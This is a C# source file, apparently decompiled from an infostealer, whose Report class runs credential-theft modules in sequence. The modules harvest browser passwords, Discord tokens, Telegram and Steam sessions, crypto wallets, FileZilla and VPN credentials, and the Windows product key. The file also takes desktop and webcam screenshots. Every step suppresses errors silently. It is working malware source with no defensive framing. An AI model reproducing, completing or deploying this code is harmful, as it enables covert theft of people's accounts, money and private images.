using System.IO;
using Client.Modules.Passwords.Targets;
using Client.Modules.Passwords.Targets.Browsers.Chromium;
using Client.Modules.Passwords.Targets.Browsers.Edge;
using Client.Modules.Passwords.Targets.Browsers.Firefox;
using Client.Modules.Passwords.Targets.Gaming;
using Client.Modules.Passwords.Targets.Messengers;
using Client.Modules.Passwords.Targets.System;
using Client.Modules.Passwords.Targets.VPN;

namespace Client.Modules.Passwords.Helpers;

internal sealed class Report
{
	public static bool CreateReport(string sSavePath)
	{
		try
		{
			FileGrabber.Run(sSavePath + "\\Grabber");
		}
		catch
		{
		}
		try
		{
			Client.Modules.Passwords.Targets.Browsers.Chromium.Recovery.Run(sSavePath + "\\Browsers");
		}
		catch
		{
		}
		try
		{
			Client.Modules.Passwords.Targets.Browsers.Edge.Recovery.Run(sSavePath + "\\Browsers");
		}
		catch
		{
		}
		try
		{
			Client.Modules.Passwords.Targets.Browsers.Firefox.Recovery.Run(sSavePath + "\\Browsers");
		}
		catch
		{
		}
		try
		{
			Discord.WriteDiscord(Discord.GetTokens(), sSavePath + "\\Messenger\\Discord");
		}
		catch
		{
		}
		try
		{
			Pidgin.GetAccounts(sSavePath + "\\Messenger\\Pidgin");
		}
		catch
		{
		}
		try
		{
			Telegram.GetTelegramSessions(sSavePath + "\\Messenger\\Telegram");
		}
		catch
		{
		}
		try
		{
			Steam.GetSteamSession(sSavePath + "\\Gaming\\Steam");
			Uplay.GetUplaySession(sSavePath + "\\Gaming\\Uplay");
		}
		catch
		{
		}
		try
		{
			Minecraft.SaveAll(sSavePath + "\\Gaming\\Minecraft");
		}
		catch
		{
		}
		try
		{
			Wallets.GetWallets(sSavePath + "\\Wallets");
		}
		catch
		{
		}
		try
		{
			FileZilla.WritePasswords(FileZilla.Steal(), sSavePath + "\\FileZilla");
		}
		catch
		{
		}
		try
		{
			ProtonVPN.Save(sSavePath + "\\VPN\\ProtonVPN");
			OpenVPN.Save(sSavePath + "\\VPN\\OpenVPN");
			NordVPN.Save(sSavePath + "\\VPN\\NordVPN");
		}
		catch
		{
		}
		try
		{
			Directory.CreateDirectory(sSavePath + "\\Directories");
			DirectoryTree.SaveDirectories(sSavePath + "\\Directories");
		}
		catch
		{
		}
		try
		{
			Directory.CreateDirectory(sSavePath + "\\System");
		}
		catch
		{
		}
		try
		{
			ProcessList.WriteProcesses(sSavePath + "\\System");
			ActiveWindows.WriteWindows(sSavePath + "\\System");
		}
		catch
		{
		}
		try
		{
			DesktopScreenshot.Make(sSavePath + "\\System");
			WebcamScreenshot.Make(sSavePath + "\\System");
		}
		catch
		{
		}
		try
		{
			Wifi.SavedNetworks(sSavePath + "\\System");
			Wifi.ScanningNetworks(sSavePath + "\\System");
		}
		catch
		{
		}
		try
		{
			File.WriteAllText(sSavePath + "\\System\\ProductKey.txt", ProductKey.GetWindowsProductKeyFromRegistry());
		}
		catch
		{
		}
		return true;
	}
}
